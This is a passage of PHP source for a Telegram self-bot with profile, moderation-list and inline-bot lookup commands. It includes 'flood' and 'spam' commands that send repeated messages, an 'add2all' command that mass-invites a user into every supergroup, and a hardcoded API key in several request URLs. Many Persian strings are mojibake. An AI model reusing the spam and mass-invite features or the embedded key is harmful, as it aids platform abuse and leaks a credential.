                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅโคโค๐ต๐๐ ๐๐๐๐๐๐๐ ๐๐๐๐๐๐๐ ๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐๐โฆโฆ๐ฅ', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โ๐ป๐๐ ๐๐๐๐ ๐๐ ๐๐๐ ๐๐ ๐๐๐ ๐๐๐๐๐ ๐๐๐๐.', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\\/\\#\\!]?(tophoto)\$/i", $text)) {
                        if (isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $rp = $update['message']['reply_to']['reply_to_msg_id'];
                            $Chat = (yield $this->getPwrChat($peer, false));
                            $type = $Chat['type'];
                            if (in_array($type, ['channel', 'supergroup'])) {
                                $messeg = (yield $this->channels->getMessages(['channel' => $peer, 'id' => [$rp]]));
                            } else {
                                $messeg = (yield $this->messages->getMessages(['id' => [$rp]]));
                            }
                            if (isset($messeg['messages'][0]['media'])) {
                                $media = $messeg['messages'][0]['media'];
                                $output_file_name = yield $this->downloadToFile($media, 'files/amir.jpg');
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ ุนฺฉุณ ุดูุง ุจุง ูููู?ุช ุชูุณุท ุฑุจุงุช ุณูู ูพุงูู ุงุณุชุฎุฑุงุฌ ุดุฏ! ๐ฅ"]);

                                $sentMessage = yield $this->messages->sendMedia([
                                    'peer' => $peer,
                                    'media' => [
                                        '_' => 'inputMediaUploadedPhoto',
                                        'message' => '((((:',
                                        'file' => 'files/amir.jpg',
                                        'parse_mode' => 'Markdown'
                                    ]]);
                                unlink('files/amir.jpg');
                            } else {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Error  !"]);
                                unlink('files/amir.jpg');
                            }
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุฑู? ?ฺฉ ูพ?ุงู ุฑ?ูพู? ฺฉู?ุฏ !"]);
                            unlink('files/amir.jpg');
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(setpiclink) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setpiclink) (.*)$/si", $text, $m);
                        if (strpos($m[2], '.jpg') !== false) {
                            yield $this->filePutContents('aks.txt', $m[2]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅLink Set Shod๐ฅ', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โ๐ป๐๐ ๐๐๐๐ ๐๐ ๐๐๐ ๐๐ ๐๐๐ ๐๐๐๐๐ ๐๐๐๐.', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setmentionid) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setmentionid) (.*)$/si", $text, $m);
                        if (strlen($m[2]) < 20) {
                            yield $this->filePutContents('mentionid.txt', $m[2]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅID Baray Halat Mention2 Set Shod๐ฅ', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โID ro Bayad Kamtar Az 20 Character Bezani', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(sethelper) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(sethelper) (.*)$/si", $text, $m);
                        if (strlen($m[2]) < 20) {
                            yield $this->filePutContents('helper.txt', $m[2]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅID Baray Panel Helper Set Shod๐ฅ', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โID ro Bayad Kamtar Az 20 Character Bezani', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if ($text == "/cbio") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "mage ba to shookhi daram? bezan /cbio <custom bio>"]);
                    }
                    if (stripos($text, '/cbio ') === 0) {
                        $param = str_replace('/cbio ', '', $text);
                        if (strlen($param) > 65) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โBayad Kamtar Az 65 Character Bezani"]);
                        } else {
                            yield $this->filePutContents('cbio.txt', $param);
                            if ($param == "off") {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Custom bio off shod"]);
                                $this->account->updateProfile(['about' => ' ']);
                            } else {
                                $param = bioToCustom($param);
                                $this->account->updateProfile(['about' => $param]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Bio set!\n$param"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(webhook)  (.*) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(webhook)  (.*) (.*)$/si", $text, $m);
                        $token = $m[2];
                        $adress = $m[3];
                        yield $this->fileGetContents('https://api.telegram.org/bot' . $token . '/setWebhook?url=' . $adress);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$adress-$token webhookedโ."]);
                    }
                    if (preg_match("/^[\/\#\!]?(setbio) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setbio) (.*)$/si", $text, $m);
                        if (strlen($m[2]) < 70) {
                            yield $this->account->updateProfile(['about' => $m[2]]);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษดแดแดก แดสแดแดแด ๊ฑแดแดโ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โBayad Kamtar Az 65 Character Bezani', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setusername) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setusername) (.*)$/si", $text, $m);
                        yield $this->account->updateUsername(['username' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษดแดแดก แด๊ฑแดส ษดแดแดแด ๊ฑแดแดโ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(join) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(join) (.*)$/si", $text, $m);
                        yield $this->channels->joinChannel(['channel' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดษชษดแดแด!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(add2all) (@.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(add2all) (@.*)$/si", $text, $m);
                        $dialogs = yield $this->getDialogs();
                        foreach ($dialogs as $peeer) {
                            $peer_info = yield $this->getInfo($peeer);
                            $peer_type = $peer_info['type'];
                            if ($peer_type == "supergroup") {
                                yield $this->channels->inviteToChannel(['channel' => $peeer, 'users' => [$m[2]]]);
                            }
                        }
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "แดแดแดแดแด แดแด แดสส ๊ฑแดแดแดสษขสแดแดแด๊ฑ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/si", $text, $m);
                        $txxt = $m[2];
                        $answeer = $m[3];
                        if (!isset($data['answering'][$txxt])) {
                            $data['answering'][$txxt] = $answeer;
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Nาฝษฏ Wฯษพิ ADDED Tฯ AษณสษฏาฝษพLฮนสฦ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Tิฮนส Wฯษพิ Wฮฑส Iษณ Aษณสษฏาฝษพสฮนสฦ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text, $m);
                        $txxt = $m[2];
                        if (isset($data['answering'][$txxt])) {
                            unset($data['answering'][$txxt]);
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Wฯษพิ Dาฝสาฝฦาฝิ Fษพฯษฑ Aษณสษฏาฝษพสฮนสฦ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Tิฮนส Wฯษพิ Wฮฑสษณ'ฦ IN Aษณสษฏาฝษพสฮนสฦ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(reset answers)$/si", $text)) {
                        $data['answering'] = [];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Aษณสษฏาฝษพสฮนสฦ IS Nฯษฏ Eษฑฯฦแง"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setenemy) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setenemy) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (!in_array($me_id, $data['enemies'])) {
                                $data['enemies'][] = $me_id;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->block(['id' => $m[2]]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ษช๊ฑ ษดแดแดก ษชษด แดษดแดแดส สษช๊ฑแด"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดสษช๊ฑ แด๊ฑแดส แดกแด๊ฑ ษชษด แดษดแดแดสสษช๊ฑแด"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(mute) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(mute) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (!in_array($me_id, $data['muted'])) {
                                $data['muted'][] = $me_id;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ษช๊ฑ ษดแดแดก แดแดแดแด สษช๊ฑแด"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดสแด แด๊ฑแดส แดกแด๊ฑ ษชษด แดแดแดแดสษช๊ฑแด"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delenemy) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(delenemy) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (in_array($me_id, $data['enemies'])) {
                                $k = array_search($me_id, $data['enemies']);
                                unset($data['enemies'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->unblock(['id' => $m[2]]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name แดแดสแดแดแดแด ๊ฐสแดแด แดษดแดแดส สษช๊ฑแด"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดสษช๊ฑ แด๊ฑแดส แดกแด๊ฑษด'แด ษชษด แดษดแดแดสสษช๊ฑแด"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(unmute) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(unmute) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (in_array($me_id, $data['muted'])) {
                                $k = array_search($me_id, $data['muted']);
                                unset($data['muted'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name แดแดสแดแดแดแด ๊ฐสแดแด แดแดแดแด สษช๊ฑแด"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดสษช๊ฑ แด๊ฑแดส แดกแด๊ฑษด'แด ษชษด แดแดแดแด สษช๊ฑแด"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(reset enemylist)$/si", $text)) {
                        $data['enemies'] = [];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดษดแดแดสสษช๊ฑแด ษช๊ฑ ษดแดแดก แดแดแดแดส!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(reset mutelist)$/si", $text)) {
                        $data['muted'] = [];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐ด๐๐๐๐ณ๐๐๐ ๐ฐ๐ ๐ต๐๐ ๐ฌ๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(enemylist)$/si", $text)) {
                        if (count($data['enemies']) > 0) {
                            $txxxt = "แดษดแดแดสสษช๊ฑแด :
";
                            $counter = 1;
                            foreach ($data['enemies'] as $ene) {
                                $mee = yield $this->getFullInfo($ene);
                                $me = $mee['User'];
                                $me_name = $me['first_name'];
                                $txxxt .= "$counter: $me_name \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐ต๐ ๐ฌ๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(mutelist)$/si", $text)) {
                        if (count($data['muted']) > 0) {
                            $txxxt = "แดแดแดแดสษช๊ฑแด :
";
                            $counter = 1;
                            foreach ($data['muted'] as $ene) {
                                $mee = yield $this->getFullInfo($ene);
                                $me = $mee['User'];
                                $me_name = $me['first_name'];
                                $txxxt .= "$counter: $me_name \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ษดแด แดแดแดแดแด!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(inv) (@.*)$/si", $text) && $update['_'] == "updateNewChannelMessage") {
                        preg_match("/^[\/\#\!]?(inv) (@.*)$/si", $text, $m);
                        $peer_info = yield $this->getInfo($message['to_id']);
                        $peer_type = $peer_info['type'];
                        if ($peer_type == "supergroup") {
                            yield $this->channels->inviteToChannel(['channel' => $message['to_id'], 'users' => [$m[2]]]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดแด๊ฑแด ๊ฑแดแดแดสษขสแดแดแด๊ฑ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(leave)$/si", $text)) {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Leaved!"]);
                        yield $this->channels->leaveChannel(['channel' => $peer]);
                    }
                    if (preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/si", $text, $m);
                        $count = $m[2];
                        $txt = $m[3];
                        if ($count >= 51) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Max Count == 50", 'parse_mode' => 'MarkDown']);
                        } else {
                            $spm = "";
                            for ($i = 1; $i <= $count; $i++) {
                                $spm .= " $txt \n";
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $spm]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/si", $text, $m);
                        $count = $m[2];
                        $txt = $m[3];
                        if ($count >= 51) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Max Count == 50", 'parse_mode' => 'MarkDown']);
                        } else {
                            for ($i = 1; $i <= $count; $i++) {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $txt "]);
                            }
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(encode) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(encode) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $enc = base64_encode($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Encoded : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(nic) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(nic) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = yield $this->fileGetContents("https://citroapi.ir/nic/?key=Y3LC-EAAZ-75U9-5SDD&q=$txt");
                        $url2 = json_decode(yield $this->fileGetContents("https://citroapi.ir/nic/?key=Y3LC-EAAZ-75U9-5SDD&q=$txt"), true);
                        if (isJson($url)) {
                            $description = $url2['description'];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $description "]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $url "]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(akschie) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(akschie) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = json_decode(yield $this->fileGetContents("https://api.codebazan.ir/caption/?pic=$txt"), true);
                        $message = $url['message'];
                        $messagefa = $url['messagefa'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
$message

", 'parse_mode' => 'HTML']);
                    }
                    if (preg_match("/^[\/\#\!]?(ipinfo) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(ipinfo) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = json_decode(yield $this->fileGetContents("https://citroapi.ir/ip/?key=Y3LC-EAAZ-75U9-5SDD&ip=$txt"), true);
                        if ($url['status'] == "fail") {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " dorost bezan ip ro /= "]);
                        } else {
                            if (isset($url['city'])) {
                                $country = $url['country'];
                                $city = $url['city'];
                                $query = $url['query'];
                                $isp = $url['isp'];
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
ุงุทูุงุนุงุช ุข?ูพ? : $query

ฺฉุดูุฑ ุข?ูพ? ููุฑุฏ ูุธุฑ : $country

ุดูุฑ : $city

ุฏ?ุชุงุณูุชุฑ : $isp
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
", 'parse_mode' => 'HTML']);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(insta) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(insta) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = json_decode(yield $this->fileGetContents("https://citroapi.ir/instagram/?key=Y3LC-EAAZ-75U9-5SDD&user=$txt"), true);
                        if ($url['status'] == "failed") {
                            $pagekifi = $url['description'];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " Error : $pagekifi "]);
                        } else {
                            if (isset($url['username'])) {
                                $username = $url['username'];
                                $followers = $url['followers'];
                                $user_id = $url['user_id'];
                                $followings = $url['followings'];
                                $profile = $url['profile'];
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
?ูุฒุฑ ุข?ุฏ? : $user_id

?ูุฒุฑ  : $username

ุชุนุฏุงุฏ ูุงูููุฑ ูุง : $followers

ุชุนุฏุงุฏ ูุงููู??ูฺฏ ูุง : $followings

ู?ูฺฉ ุนฺฉุณ ูพุฑููุง?ู : $profile
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
", 'parse_mode' => 'HTML']);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(decode) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(decode) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $enc = base64_decode($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Decoded : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(hash) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(hash) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $enc = md5($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Hashed : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(music) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(music) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@melobot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }

                    if (preg_match("/^[\/\#\!]?(wiki) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(wiki) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@wiki", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(youtube) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(youtube) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@vid", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(pic) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(pic) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@pic", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(meme) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(meme) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@Persian_Meme_Bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(calc) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(calc) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@CalcuBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gif) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(gif) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@gif", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(blue) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(blue) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@TextMagicBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(apk) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(apk) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@apkdl_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(sticker) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(sticker) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@big_text_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(google) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(google) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@GoogleDEBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(joke)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(joke)$/si", $text, $m);
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(aasab)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(aasab)$/si", $text, $m);
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][1]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(like) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(like) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@like", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
